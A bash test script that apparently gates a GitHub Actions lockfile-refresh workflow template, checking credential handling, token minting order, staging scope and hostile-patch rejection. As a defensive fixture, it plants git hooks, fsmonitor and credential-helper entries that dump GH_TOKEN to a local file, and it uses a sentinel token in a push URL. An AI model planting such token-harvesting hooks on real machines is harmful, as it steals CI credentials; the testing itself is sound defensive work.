#!/usr/bin/env bash
# test-deps-cadence-policy.sh — pins the policy of setup-deps' monthly
# lockfile-refresh templates, deps-cadence.template.yml (thin trigger) and
# deps-cadence-impl.template.yml (issue #509).
#
# Every rule below was broken by at least one of the hand copies the template
# replaces, and every one of those defects passes actionlint, because the YAML
# and the shell are valid, just permissive. So this gate asserts the policy
# itself:
#
#   1. ONE credential. No GITHUB_TOKEN and no PAT fallback: every GH_TOKEN is
#      the minted App token, the only secrets read are the two App
#      credentials, and the trigger passes exactly those two (never
#      `secrets: inherit`). A hand copy fell back to GITHUB_TOKEN when its PAT
#      was absent and logged a warning; the PR it opened never fired CI, and
#      the run was green every time.
#   2. A FAILED REFRESH FAILS THE JOB. Executed: the real refresh step runs
#      against a scratch repo with a package manager that exits 1, and an
#      unknown ecosystem in LANES; both must fail the step. Also no
#      `continue-on-error` on any step.
#   3. NO --label. A label the repo lacks makes `gh pr create` fail, which is
#      what stopped a hand copy two months running. No guarded form exists in
#      this version, so any --label / --add-label fails; adding one means
#      setup-deps creating the label and this gate learning the guard.
#   4. git add LIMITED TO THE LANES' FILES. Static: exactly one `git add`, from
#      the recorded pathspec file, and no -A / . / -u / commit -a. Executed: a
#      refresh that also edits a tracked non-lane file and creates an untracked
#      one commits only the lanes' manifests and lockfiles.
#   5. THE SCHEDULE-BEARING FILE REFERENCES ONLY LOCAL WORKFLOWS. A schedule is
#      attributed to whoever last touched its file, so a Dependabot bump of a
#      third-party `uses:` there would re-attribute the cron and it would stop
#      firing silently. The impl carries no `schedule:` of its own.
#   6. PLAIN `gh pr merge --auto`, NO METHOD FLAG (the merge-queue rule), and
#      at least one such call exists. Executed: the fake gh must receive
#      exactly `pr merge --auto <url>`.
#   7. Nothing moved: exit 0 with a notice and no PR. Executed.
#   9. EPHEMERAL GITHUB-HOSTED RUNNER, LATE MINT, NO TOKEN IN ARGV (version 2,
#      after a security review of #512). The job runs package-manager code and
#      then holds the ORG-WIDE platform-writer App token, so:
#        - runs-on is a GitHub-hosted ubuntu label, never self-hosted and never
#          a render-time fact: a persistent shared runner can carry a
#          PATH-shadowing git/gh/bun/cargo, a global gitconfig hook or
#          credential helper, or a modified tool cache from any earlier job;
#        - the mint step comes AFTER every package-manager step (refresh and
#          report) and before the PR step, and nothing before it reads
#          steps.app_token; earlier reads use the built-in token, whose
#          permissions grant no write, so it cannot serve as a fallback;
#        - executed: a `git` wrapper on PATH logs every git argv in the PR
#          step, and the sentinel token must appear in none of them; a global
#          gitconfig (core.fsmonitor, hooksPath, credential.helper) and a repo
#          pre-commit / pre-push hook that would each dump GH_TOKEN must
#          capture nothing; and the credential helper, run on its own through
#          `git credential fill`, must answer the token from the environment.
#  10. THREE JOBS, AND THE PATCH IS UNTRUSTED (version 3). Static: the refresh
#      job references no secret and mints nothing; the plan job references the
#      secrets only in its presence check; the App token is minted once, in
#      open-pr, after the validate step; open-pr uses only checkout,
#      download-artifact and the token action and runs no package manager.
#      Executed: the refresh and package steps run in one scratch repo, and the
#      validate/apply and PR steps run in a FRESH clone of it, as open-pr does.
#      Hostile patches built in a third clone (a .github/ edit, a rename, a
#      mode change, a symlink, a new file on an allowed path, a binary hunk)
#      must each be rejected with the tree left untouched.
#  11. A WORKSPACE-ROOT bun lane runs `bun update --recursive` (plain
#      `bun update` there moves only the root's own dependencies). Executed: a
#      fake bun logs its argv.
#   8. The exact-pin report (ported from a consumer's deps-update script): its
#      `bun outdated` table parser against VERBATIM bun 1.4.2 captures in
#      scripts/fixtures/deps-cadence/ (plain, workspaces with the extra column,
#      and coloured, where bun draws columns with U+2502 and wraps cells in ANSI
#      codes), and garbage must parse to nothing. End to end: a stale exact pin
#      is reported, a range is not, a failing `bun outdated` reads "could not
#      evaluate" (never current), and the report step does not depend on
#      whether anything moved.
#  12. THE PUB AND CARGO EXACT-PIN REPORT (version 4, #522) is a SECOND section
#      with its own step, not an extension of the bun and npm one. A consumer
#      (Sassy-Dog/routines, parity/setup-deps-template-strings.tsv) matches the
#      bun and npm section by literal strings, so those five (the heading, the
#      table header and the three outcome sentences) are pinned HERE to stay
#      byte-identical; the new section reuses the table header and two of the
#      sentences and says "No pub or cargo lane declares an exact pin." where
#      the old one says "bun or npm". Same job, same place in the graph: a
#      step in the secret-free refresh job after the bun and npm report, so it
#      is ordered before the mint like every package manager. It appends to
#      the same pins.md (the PR body) and the job summary, runs whether or not
#      anything moved, and writes NOTHING when LANES holds no pub or cargo lane,
#      so a bun- or npm-only repo's report does not change. Newest versions
#      come from tools that need no credential: `flutter pub outdated --json`
#      (the Flutter the job installed from the repo's pin) and, for cargo,
#      `cargo metadata --no-deps` for the declared requirements (offline, and
#      it resolves workspace inheritance, so no hand-parsed TOML) plus
#      `cargo search` for the newest release. `cargo search` was chosen over
#      `cargo info` (cargo 1.82+ only, and a repo may pin an older toolchain)
#      and over the sparse index (yank and prerelease handling to reimplement).
#      Its output is `name = "x.y.z"` lines in relevance order, so the
#      executed check feeds it a PREFIX sibling first (serde_json before
#      serde): taking the first line instead of the exact name reports the
#      wrong "latest". An exact pin is "=x.y.z" in cargo (a bare "x.y.z" is a
#      caret range) and a bare "x.y.z" in pub (a caret is a range). Executed:
#      stale pins are reported in both ecosystems and ranges are not; a failing
#      tool or an unparseable answer is "could not evaluate", never current; a
#      path or git dependency with an exact requirement is not looked up.
#
# 14. THE BARE ignore: HOLDS REPORT (version 6, #524) is a THIRD section with its
#      own step after the pub and cargo one: `### Bare ignore: holds`, the same
#      `| Lane | Package | Resolved | Latest |` shape, appended to pins.md and
#      the job summary and run whether or not anything moved. The two exact-pin
#      sections stay byte-identical (their literals are pinned in 8 and 12). It
#      lists a hold (a `dependency-name` with no `update-types` or `versions`)
#      whose resolved version is behind latest; it reads the holds at RUN time
#      from the checked-out .github/dependabot.yml, with the parser
#      render-cadence.sh injects at the `{{IGNORE_RULES_AWK}}` placeholder
#      (the SAME `IGNORE_RULES_AWK` extract_ignore_rules runs, so there is no
#      hand copy to drift; test-deps-cadence-render.sh pins the injection). A
#      real lookup only for bun, npm, pub and cargo; a hold in any other
#      ecosystem, in a directory no refreshed lane covers, or whose lookup
#      failed is `Could not evaluate (<reason>)`, never current. Executed with
#      fake tools on a scratch repo: stale holds in two ecosystems listed, a
#      limited hold not, gradle unevaluated, a hand-added hold read, failed
#      lookups unevaluated, no lane unevaluated, no dependabot.yml. The routines
#      parity file needs the new heading `### Bare ignore: holds`.
#
# 13. THE OPT-IN CODEGEN WORKFLOW (deps-cadence-codegen.template.yml, #519) is
#      pinned in its own section at the end of this file (cg_static for the
#      template, cg_exec for the blocks it extracts and runs, with its own
#      mutations). The impl-side change it came with is pinned here too: every
#      git call in open-pr passes `nohooks` (template-version 5).
#
# Vacuous-green guards: each step this gate executes or slices must be found
# (a renamed step would otherwise check nothing), and every mutation must
# change the template, or it proves nothing.
#
# Mutation-proof: each regression above is applied to a copy of a template and
# the whole check must fail on it.
#
# No gh, no network, no actionlint (test-template-actionlint.sh lints the
# renders). git, jq and perl; fake bun / cargo / gh on PATH.
#
# Wired into scripts/preflight.sh; run directly:
#   bash scripts/test-deps-cadence-policy.sh
set -uo pipefail
export LC_ALL=C

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
TPL_DIR="$ROOT/skills/setup-deps/references/templates"
TRIGGER="$TPL_DIR/deps-cadence.template.yml"
IMPL="$TPL_DIR/deps-cadence-impl.template.yml"
FIX="$ROOT/scripts/fixtures/deps-cadence"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

fail=0
ok()  { echo "  ok   $*"; }
bad() { echo "  FAIL $*"; fail=1; }

for need in git jq perl; do
    command -v "$need" >/dev/null 2>&1 || { echo "test-deps-cadence-policy: $need not on PATH" >&2; exit 1; }
done

REFRESH_STEP="Refresh each lane within its declared ranges"
REPORT_STEP="Report exact pins (bun and npm lanes)"
REPORT2_STEP="Report exact pins (pub and cargo lanes)"
HOLDS_STEP="Report bare ignore holds"
PR_STEP="Open the refresh PR and enqueue it"
PACKAGE_STEP="Package the refresh as a patch"
VALIDATE_STEP="Validate and apply the refresh patch"

# code <file> — the template body (after `---`) without comment-only lines.
# Comments explain the rules in the very words the checks forbid.
code() { sed -n '/^---$/,$p' "$1" | grep -vE '^[[:space:]]*#'; }

# job_block <file> <job> — one job's lines under `jobs:`, comments included.
job_block() {
    awk -v want="  $2:" '
        $0 == want { f = 1; print; next }
        f && /^  [a-z][a-z0-9_-]*:$/ { exit }
        f && /^[a-z]/ { exit }
        f { print }' "$1"
}

# step_block <file> <name> — one step's lines, from `- name:` to the next step.
step_block() {
    awk -v want="      - name: $2" '
        index($0, want) == 1 { f = 1; print; next }
        f && /^      - (name|uses):/ { exit }
        f && /^# \{\{/ { exit }
        f { print }' "$1"
}
# step_run <file> <name> — that step's `run: |` body, dedented.
step_run() {
    awk -v want="      - name: $2" '
        index($0, want) == 1 { step = 1; next }
        step && /^        run: \|$/ { body = 1; next }
        body && /^[[:space:]]*$/ { print ""; next }
        body && !/^          / { exit }
        body { sub(/^          /, ""); print }' "$1"
}

# --- fake tools -------------------------------------------------------------------
BIN="$WORK/bin"
mkdir -p "$BIN"
cat > "$BIN/bun" <<'SH'
#!/usr/bin/env bash
# FAKE_BUN_MODE: ok | fail ; FAKE_BUN_OUTDATED: file to print for `outdated`
printf '%s\n' "$*" >> "${FAKE_BUN_LOG:-/dev/null}"
case "$1" in
    update)
        [ "${FAKE_BUN_MODE:-ok}" = "fail" ] && { echo "error: registry unreachable" >&2; exit 1; }
        echo "lock $RANDOM" >> bun.lock
        [ -f pkg/package.json ] && echo ' ' >> pkg/package.json
        [ -f README.md ] && echo 'touched' >> README.md
        echo 'stray' > new.txt
        exit 0 ;;
    outdated)
        cat "${FAKE_BUN_OUTDATED:-/dev/null}"
        exit "${FAKE_BUN_OUTDATED_RC:-0}" ;;
esac
exit 0
SH
cat > "$BIN/cargo" <<'SH'
#!/usr/bin/env bash
# FAKE_CARGO_METADATA / FAKE_CARGO_SEARCH: files to print for `metadata` /
# `search`; FAKE_CARGO_SEARCH_RC: search's exit status.
case "$1" in
    metadata) cat "${FAKE_CARGO_METADATA:-/dev/null}"; exit "${FAKE_CARGO_METADATA_RC:-0}" ;;
    search)   cat "${FAKE_CARGO_SEARCH:-/dev/null}"; exit "${FAKE_CARGO_SEARCH_RC:-0}" ;;
esac
[ "$1" = "update" ] || exit 0
echo "# bumped" >> Cargo.lock
[ -f src/main.rs ] && echo '// touched' >> src/main.rs
exit 0
SH
cat > "$BIN/flutter" <<'SH'
#!/usr/bin/env bash
# FAKE_FLUTTER_OUTDATED: file to print for `pub outdated --json`.
if [ "$1 $2" = "pub outdated" ]; then
    cat "${FAKE_FLUTTER_OUTDATED:-/dev/null}"
    exit "${FAKE_FLUTTER_RC:-0}"
fi
exit 0
SH
cat > "$BIN/gh" <<'SH'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$FAKE_GH_LOG"
case "$1 $2" in
    "api users/"*) echo 4242 ;;
    "pr create")   echo "https://github.com/o/r/pull/7" ;;
esac
exit 0
SH
# git: the real one, with every argv logged, so a token in argv is visible.
REAL_GIT="$(command -v git)"
cat > "$BIN/git" <<SH
#!/usr/bin/env bash
printf '%s\n' "\$*" >> "\${FAKE_GIT_LOG:-/dev/null}"
exec "$REAL_GIT" "\$@"
SH
chmod +x "$BIN"/*
SENTINEL="ghs_SENTINELtoken9f3a"

# gh_shell <script> [env…] — run a step body the way GitHub does.
gh_shell() { local s="$1"; shift; env "$@" PATH="$BIN:$PATH" bash --noprofile --norc -eo pipefail "$s"; }

# new_repo <dir> — a committed scratch repo: a bun lane at web/ (with a
# workspace member and a tracked non-lane file) and a cargo lane at the root.
new_repo() {
    local d="$1"
    mkdir -p "$d/web/pkg" "$d/src"
    (
        cd "$d" || exit 1
        git init -q -b main
        git config user.name t; git config user.email t@example.com
        echo '{"name":"web","workspaces":["pkg"],"dependencies":{"is-number":"6.0.0","left-pad":"^1.1.0"},"devDependencies":{"kind-of":"=6.0.3"}}' > web/package.json
        echo 'lock' > web/bun.lock
        echo '{"name":"pkg"}' > web/pkg/package.json
        echo 'readme' > web/README.md
        echo '[package]' > Cargo.toml
        echo 'lock' > Cargo.lock
        echo 'fn main() {}' > src/main.rs
        mkdir -p .github/workflows web/sym
        echo 'name: ci' > .github/workflows/ci.yml
        ln -s ../package.json web/sym/package.json
        git add -A && git commit -qm init
    )
}

# --- the check -------------------------------------------------------------------
# check <trigger> <impl> — 0 when every rule holds, 1 with reasons otherwise.
check() {
    local trig="$1" impl="$2" rc=0 c line n refresh report prstep d out

    # 1. one WRITE credential. The built-in token may only read: it appears
    #    solely as the plan step's GH_TOKEN, and the permissions grant no write.
    c="$(code "$impl")"
    if grep -qE 'GITHUB_TOKEN' <<<"$c"; then
        echo "impl reads GITHUB_TOKEN outside a comment (no fallback credential)"; rc=1
    fi
    if grep -qE ':[[:space:]]*write([[:space:]]|$)' <<<"$c"; then
        echo "impl permissions grant the built-in token write"; rc=1
    fi

    # 10 (static). secrets only in the plan job's presence check and open-pr;
    # one mint, in open-pr; open-pr runs nothing but git, gh and three actions.
    local jplan jrefresh jopen
    jplan="$(job_block "$impl" plan | grep -vE '^[[:space:]]*#')"
    jrefresh="$(job_block "$impl" refresh | grep -vE '^[[:space:]]*#')"
    jopen="$(job_block "$impl" open-pr | grep -vE '^[[:space:]]*#')"
    if [ -z "$jplan" ] || [ -z "$jrefresh" ] || [ -z "$jopen" ]; then
        echo "could not slice the plan, refresh and open-pr jobs (renamed?)"; rc=1
    fi
    if grep -qE 'secrets\.|create-github-app-token|app_token' <<<"$jrefresh"; then
        echo "the refresh job references a secret or the App token; it runs package managers and must hold neither"; rc=1
    fi
    if grep -qE 'create-github-app-token|app_token' <<<"$jplan"; then
        echo "the plan job mints or reads the App token"; rc=1
    fi
    if [ "$(grep -cE 'secrets\.' <<<"$jplan")" -ne "$(grep -cE 'secrets\.' <<<"$(step_block "$impl" "Require the app credentials")")" ]; then
        echo "the plan job references a secret outside its presence check"; rc=1
    fi
    if [ "$(grep -cE 'actions/create-github-app-token@' <<<"$c")" -ne 1 ] || ! grep -qE 'actions/create-github-app-token@' <<<"$jopen"; then
        echo "the App token must be minted exactly once, in open-pr"; rc=1
    fi
    local u
    while IFS= read -r u; do
        [ -n "$u" ] || continue
        case "$u" in
            actions/checkout@*|actions/download-artifact@*|actions/create-github-app-token@*) ;;
            *) echo "open-pr uses '$u'; it may use only checkout, download-artifact and the token action"; rc=1 ;;
        esac
    done < <(sed -nE 's/^[[:space:]]*(- )?uses:[[:space:]]*([^[:space:]]+).*/\2/p' <<<"$jopen")
    if grep -qE '(^|[;&|({[:space:]])(bun|bunx|npm|npx|yarn|pnpm|node|flutter|dart|cargo|rustup|pod|make|python3?|pip3?)([[:space:]]|$)' <<<"$jopen"; then
        echo "open-pr runs a package manager or interpreter: $(grep -E '(^|[;&|({[:space:]])(bun|bunx|npm|npx|yarn|pnpm|node|flutter|dart|cargo|rustup|pod|make|python3?|pip3?)([[:space:]]|$)' <<<"$jopen" | head -1 | tr -s ' ')"; rc=1
    fi
    if [ "$(grep -cE 'github\.token' <<<"$c")" -gt 1 ] \
        || ! grep -qE '^          GH_TOKEN: \$\{\{ github\.token \}\}$' <<<"$(step_block "$impl" "Plan this month's run")" \
            && grep -qE 'github\.token' <<<"$c"; then
        echo "the built-in token may appear only as the plan step's read-only GH_TOKEN"; rc=1
    fi
    if ! grep -qE '^          GH_TOKEN: \$\{\{ steps\.app_token\.outputs\.token \}\}$' <<<"$(step_block "$impl" "$PR_STEP")"; then
        echo "the PR step's GH_TOKEN is not exactly the minted App token"; rc=1
    fi
    local used
    used="$(grep -oE 'secrets\.[A-Za-z_][A-Za-z0-9_]*' <<<"$c" | sort -u)"
    if grep -vqxE 'secrets\.PLATFORM_WRITER_APP_(CLIENT_ID|PRIVATE_KEY)' <<<"$used"; then
        echo "impl reads a secret other than the two App credentials: $(tr '\n' ' ' <<<"$used")"; rc=1
    fi
    n="$(grep -cE '^[[:space:]]*GH_TOKEN:' <<<"$c")"
    if [ "$n" -eq 0 ]; then
        echo "impl sets no GH_TOKEN; the write steps cannot be using the App token"; rc=1
    fi
    while IFS= read -r line; do
        [ -n "$line" ] || continue
        if ! [[ "$line" =~ ^[[:space:]]*GH_TOKEN:[[:space:]]*\$\{\{[[:space:]]*(steps\.app_token\.outputs\.token|github\.token)[[:space:]]*\}\}[[:space:]]*$ ]]; then
            echo "GH_TOKEN is neither the minted App token nor the read-only built-in one (a fallback?): $line"; rc=1
        fi
    done < <(grep -E '^[[:space:]]*GH_TOKEN:' <<<"$c")
    c="$(code "$trig")"
    if grep -qE 'secrets:[[:space:]]*inherit' <<<"$c"; then
        echo "trigger passes secrets: inherit; it must pass exactly the two App credentials"; rc=1
    fi
    if [ "$(grep -oE 'secrets\.[A-Za-z_][A-Za-z0-9_]*' <<<"$c" | sort -u | tr '\n' ' ')" != "secrets.PLATFORM_WRITER_APP_CLIENT_ID secrets.PLATFORM_WRITER_APP_PRIVATE_KEY " ]; then
        echo "trigger must pass exactly PLATFORM_WRITER_APP_CLIENT_ID and PLATFORM_WRITER_APP_PRIVATE_KEY"; rc=1
    fi
    if grep -qE 'GITHUB_TOKEN|github\.token' <<<"$c"; then
        echo "trigger reads GITHUB_TOKEN"; rc=1
    fi

    # 2 (static). No step may swallow its own failure.
    if grep -qE 'continue-on-error' <<<"$(code "$impl")$(code "$trig")"; then
        echo "a step sets continue-on-error; a failed refresh must fail the job"; rc=1
    fi

    # 3. no --label
    if grep -qE -- '--(add-)?label|gh label ' <<<"$(code "$impl")$(code "$trig")"; then
        echo "a --label / --add-label / gh label call exists; no guarded label form exists in this version"; rc=1
    fi

    # 4 (static). exactly one git add, from the recorded pathspec file.
    c="$(code "$impl")"
    n="$(grep -cE '(^|[^a-z-])git( [^ |;&]+)* add( |$)' <<<"$c")"
    if [ "$n" -ne 1 ] || ! grep -qE 'git( [^ ]+)* add --pathspec-from-file="\$work/stage\.z" --pathspec-file-nul[[:space:]]*$' <<<"$c"; then
        echo "git add must appear once, staging only the recorded lane paths (\$work/stage.z); found $n"; rc=1
    fi
    if grep -qE 'git( [^ ]+)* add[^\n]*( -A| --all| -u| --update| \.( |$))|git( [^ ]+)* commit[^\n]*( -a| --all| -[a-zA-Z]*a)' <<<"$c"; then
        echo "a git add/commit stages beyond the lanes' files (-A / . / -u / commit -a)"; rc=1
    fi

    # 5. local-only uses: in the schedule-bearing file; no schedule in the impl.
    c="$(code "$trig")"
    if ! grep -qE '^[[:space:]]*schedule:' <<<"$c"; then
        echo "the trigger carries no schedule: (the slice is wrong, or the cron moved)"; rc=1
    fi
    if [ -z "$(grep -E '^[[:space:]]*(- )?uses:' <<<"$c")" ]; then
        echo "the trigger calls no workflow at all"; rc=1
    fi
    while IFS= read -r line; do
        [ -n "$line" ] || continue
        if ! [[ "$line" =~ ^[[:space:]]*(-[[:space:]]+)?uses:[[:space:]]*\./ ]]; then
            echo "schedule-bearing file references a non-local workflow or action: $line"; rc=1
        fi
    done < <(grep -E '^[[:space:]]*(- )?uses:' <<<"$c")
    if grep -qE '^[[:space:]]*schedule:' <<<"$(code "$impl")"; then
        echo "the impl carries a schedule:; the cron belongs only in the thin trigger"; rc=1
    fi

    # 6 (static). plain gh pr merge --auto.
    c="$(code "$impl")"
    n="$(grep -cE 'gh pr merge' <<<"$c")"
    if [ "$n" -eq 0 ]; then
        echo "no gh pr merge call: the refresh PR would never be enqueued"; rc=1
    fi
    while IFS= read -r line; do
        [ -n "$line" ] || continue
        if [[ "$line" != *"--auto"* ]] || grep -qE -- '--(squash|merge|rebase|delete-branch)|[[:space:]]-[smrd]([[:space:]]|$)' <<<"$line"; then
            echo "gh pr merge must be plain --auto with no method flag: $line"; rc=1
        fi
    done < <(grep -E 'gh pr merge' <<<"$c")

    # 9 (static). hosted runner; late mint; no token in a URL.
    c="$(code "$impl")"
    local runs
    runs="$(grep -E '^[[:space:]]*runs-on:' <<<"$c")"
    if [ "$(grep -c . <<<"$runs")" -ne 3 ] \
        || grep -vqE '^[[:space:]]*runs-on:[[:space:]]*ubuntu-(latest|[0-9]+\.[0-9]+)[[:space:]]*$' <<<"$runs"; then
        echo "each of the three jobs must run on a GitHub-hosted ubuntu label, never self-hosted or a render-time fact: $(grep -E 'runs-on:' <<<"$c" | tr -s ' ' | tr '\n' ' ')"; rc=1
    fi
    if grep -qiE 'self-hosted' <<<"$c"; then
        echo "the impl names a self-hosted runner"; rc=1
    fi
    local mint_ln refresh_ln report_ln report2_ln holds_ln pr_ln first_ref validate_ln
    mint_ln="$(grep -nE 'actions/create-github-app-token@' "$impl" | head -1 | cut -d: -f1)"
    refresh_ln="$(grep -nF "      - name: $REFRESH_STEP" "$impl" | cut -d: -f1)"
    report_ln="$(grep -nF "      - name: $REPORT_STEP" "$impl" | cut -d: -f1)"
    report2_ln="$(grep -nF "      - name: $REPORT2_STEP" "$impl" | cut -d: -f1)"
    holds_ln="$(grep -nF "      - name: $HOLDS_STEP" "$impl" | cut -d: -f1)"
    pr_ln="$(grep -nF "      - name: $PR_STEP" "$impl" | cut -d: -f1)"
    validate_ln="$(grep -nF "      - name: $VALIDATE_STEP" "$impl" | cut -d: -f1)"
    first_ref="$(grep -nE 'steps\.app_token\.' "$impl" | head -1 | cut -d: -f1)"
    if [ -z "$mint_ln" ] || [ -z "$refresh_ln" ] || [ -z "$report_ln" ] || [ -z "$report2_ln" ] || [ -z "$holds_ln" ] || [ -z "$pr_ln" ] || [ -z "$validate_ln" ]; then
        echo "could not locate the mint, refresh, report, validate and PR steps to order them"; rc=1
    elif [ "$mint_ln" -lt "$refresh_ln" ] || [ "$mint_ln" -lt "$report_ln" ] || [ "$mint_ln" -lt "$report2_ln" ] || [ "$mint_ln" -lt "$holds_ln" ] || [ "$mint_ln" -lt "$validate_ln" ] || [ "$mint_ln" -gt "$pr_ln" ]; then
        echo "the App token is minted at line $mint_ln, not after the package managers (refresh $refresh_ln, reports $report_ln and $report2_ln) and the patch validation ($validate_ln), before the PR step ($pr_ln)"; rc=1
    elif [ -n "$first_ref" ] && [ "$first_ref" -lt "$mint_ln" ]; then
        echo "a step before the mint reads steps.app_token (line $first_ref)"; rc=1
    fi
    if grep -qE 'x-access-token:\$|https://[^ "]*\$\{?GH_TOKEN' <<<"$c"; then
        echo "the token is interpolated into a URL"; rc=1
    fi

    # --- executed ---------------------------------------------------------------
    refresh="$WORK/refresh.sh"; report="$WORK/report.sh"; prstep="$WORK/pr.sh"
    local package="$WORK/package.sh" validate="$WORK/validate.sh" report2="$WORK/report2.sh" holds="$WORK/holds.sh"
    step_run "$impl" "$REPORT2_STEP" > "$report2"
    step_run "$impl" "$HOLDS_STEP" > "$holds"
    step_run "$impl" "$REFRESH_STEP" > "$refresh"
    step_run "$impl" "$REPORT_STEP" > "$report"
    step_run "$impl" "$PR_STEP" > "$prstep"
    step_run "$impl" "$PACKAGE_STEP" > "$package"
    step_run "$impl" "$VALIDATE_STEP" > "$validate"
    for f in "$refresh" "$report" "$report2" "$holds" "$prstep" "$package" "$validate"; do
        [ -s "$f" ] || { echo "could not slice $(basename "$f" .sh) step's run block (renamed?)"; return 1; }
    done

    # 2 (executed). a failing refresh and an unknown ecosystem fail the step.
    d="$WORK/x-fail"; rm -rf "$d"; new_repo "$d"
    if (cd "$d" && gh_shell "$refresh" RUNNER_TEMP="$d.tmp" LANES="bun:/web cargo:/" FAKE_BUN_MODE=fail) >/dev/null 2>&1; then
        echo "a refresh whose package manager exits 1 did NOT fail the step"; rc=1
    fi
    if (cd "$d" && gh_shell "$refresh" RUNNER_TEMP="$d.tmp2" LANES="gradle:/") >/dev/null 2>&1; then
        echo "an ecosystem with no refresh command in LANES did NOT fail the step"; rc=1
    fi

    # 4 + 6 (executed). stage only lane files; push; plain --auto; no --label.
    d="$WORK/x-ok"; rm -rf "$d" "$d.bare" "$d.tmp" "$d.hooks" "$d.captured"; new_repo "$d"
    git init -q --bare "$d.bare"
    # A poisoned runner: a global gitconfig whose fsmonitor, hooksPath and
    # credential helper each dump GH_TOKEN, plus repo-local hooks that do too.
    mkdir -p "$d.hooks"
    printf '#!/bin/sh\necho "$GH_TOKEN" >> "%s"\nexit 0\n' "$d.captured" > "$d.hooks/steal"
    chmod +x "$d.hooks/steal"
    for h in pre-commit pre-push post-commit reference-transaction; do
        cp "$d.hooks/steal" "$d.hooks/$h"; cp "$d.hooks/steal" "$d/.git/hooks/$h"
    done
    printf '[core]\n\thooksPath = %s\n\tfsmonitor = %s\n[credential]\n\thelper = !%s\n' \
        "$d.hooks" "$d.hooks/steal" "$d.hooks/steal" > "$d.gitconfig"
    : > "$d.bunlog"
    if ! out="$(cd "$d" && gh_shell "$refresh" RUNNER_TEMP="$d.tmp" LANES="bun:/web cargo:/" FAKE_BUN_LOG="$d.bunlog" 2>&1)"; then
        echo "the refresh step failed on a healthy scratch repo: $(tail -n1 <<<"$out")"; rc=1
    else
        # 11. a workspace root refreshes recursively.
        grep -qxF 'update --recursive --ignore-scripts' "$d.bunlog" \
            || { echo "the workspace-root bun lane ran '$(head -1 "$d.bunlog")', not 'update --recursive --ignore-scripts'"; rc=1; }
        local staged
        staged="$(tr '\0' '\n' < "$d.tmp/deps-cadence/stage.z" | sort -u | tr '\n' ' ')"
        if [ "$staged" != "Cargo.lock web/bun.lock web/pkg/package.json " ]; then
            echo "the refresh recorded paths other than the lanes' manifests and lockfiles: $staged"; rc=1
        fi
        echo "report" > "$d.tmp/deps-cadence/pins.md"
        # The refresh job's last step, then the artifact hand-off to a FRESH
        # clone: open-pr never sees the refresh job's tree.
        if ! out="$(cd "$d" && gh_shell "$package" RUNNER_TEMP="$d.tmp" LANES="bun:/web cargo:/" GITHUB_OUTPUT="$d.out" 2>&1)"; then
            echo "the package step failed: $(tail -n1 <<<"$out")"; rc=1
        fi
        grep -qx 'changed=true' "$d.out" 2>/dev/null || { echo "the package step did not report changed=true"; rc=1; }
        rm -rf "$d.b" "$d.btmp"; git clone -q "$d" "$d.b"
        mkdir -p "$d.btmp"; cp -R "$d.tmp/deps-cadence-out" "$d.btmp/deps-cadence-in"
        for h in pre-commit pre-push post-commit reference-transaction; do cp "$d.hooks/steal" "$d.b/.git/hooks/$h"; done
        if ! out="$(cd "$d.b" && gh_shell "$validate" RUNNER_TEMP="$d.btmp" LANES="bun:/web cargo:/" GIT_CONFIG_GLOBAL="$d.gitconfig" 2>&1)"; then
            echo "the validate step rejected the refresh's own patch: $(grep -m1 '::error::' <<<"$out")"; rc=1
        fi
        d="$d.b"
        : > "$d.ghlog"
        : > "$d.gitlog"
        # The push target is redirected to a local bare repo through
        # environment config (which a global-config override does not remove),
        # for both the clean URL and a token-bearing one, so a token-in-URL
        # mutant still pushes and is caught by the argv log, not by a network
        # failure.
        if ! out="$(cd "$d" && gh_shell "$prstep" RUNNER_TEMP="${d%.b}.btmp" LANES="bun:/web cargo:/" GH_TOKEN="$SENTINEL" APP_SLUG=cadence-app \
                BRANCH=chore/deps-2026-10 MONTH=2026-10 DEFAULT_BRANCH=main GITHUB_REPOSITORY=o/r \
                GIT_CONFIG_GLOBAL="${d%.b}.gitconfig" FAKE_GH_LOG="$d.ghlog" FAKE_GIT_LOG="$d.gitlog" \
                GIT_CONFIG_COUNT=2 GIT_CONFIG_KEY_0="url.${d%.b}.bare.insteadOf" GIT_CONFIG_VALUE_0="https://github.com/o/r.git" \
                GIT_CONFIG_KEY_1="url.${d%.b}.bare.insteadOf" GIT_CONFIG_VALUE_1="https://x-access-token:$SENTINEL@github.com/o/r.git" 2>&1)"; then
            echo "the PR step failed: $(tail -n2 <<<"$out" | tr '\n' ' ')"; rc=1
        else
            local committed
            committed="$(git -C "${d%.b}.bare" diff-tree --no-commit-id --name-only -r refs/heads/chore/deps-2026-10 2>/dev/null | sort | tr '\n' ' ')"
            if [ "$committed" != "Cargo.lock web/bun.lock web/pkg/package.json " ]; then
                echo "the pushed commit holds files beyond the lanes' manifests and lockfiles: ${committed:-<nothing pushed>}"; rc=1
            fi
            if ! grep -qxF 'pr merge --auto https://github.com/o/r/pull/7' "$d.ghlog"; then
                echo "gh did not receive exactly 'pr merge --auto <url>': $(grep 'pr merge' "$d.ghlog")"; rc=1
            fi
            local creates
            creates="$(grep '^pr create' "$d.ghlog")"
            if grep -qE -- '--label|--add-label' <<<"$creates"; then
                echo "gh pr create received a --label"; rc=1
            fi
            if [ ! -s "$d.gitlog" ]; then
                echo "the git argv log is empty: the wrapper saw no git call, so the argv check covers nothing"; rc=1
            elif grep -qF "$SENTINEL" "$d.gitlog"; then
                echo "the App token appeared in a git argv: $(grep -F "$SENTINEL" "$d.gitlog" | head -1 | sed "s/$SENTINEL/<TOKEN>/g")"; rc=1
            fi
            if [ -s "${d%.b}.captured" ]; then
                echo "a global gitconfig program or a git hook ran with the token in its environment"; rc=1
            fi
        fi
        # The helper, run on its own, must answer the token from the env.
        local helper answer
        helper="$(sed -n "s/.*-c '\(credential\.helper=![^']*\)'.*/\1/p" "$prstep" | head -1)"
        if [ -z "$helper" ]; then
            echo "no single-quoted credential.helper=!… in the PR step"; rc=1
        else
            answer="$(printf 'protocol=https\nhost=github.com\n\n' | GH_TOKEN="$SENTINEL" GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null \
                git -c credential.helper= -c "$helper" credential fill 2>/dev/null)"
            grep -qxF "password=$SENTINEL" <<<"$answer" \
                || { echo "the credential helper does not answer the token from GH_TOKEN"; rc=1; }
        fi
    fi

    # 7 (executed). nothing moved: exit 0, notice, changed=false, so open-pr
    # never runs and no token is minted.
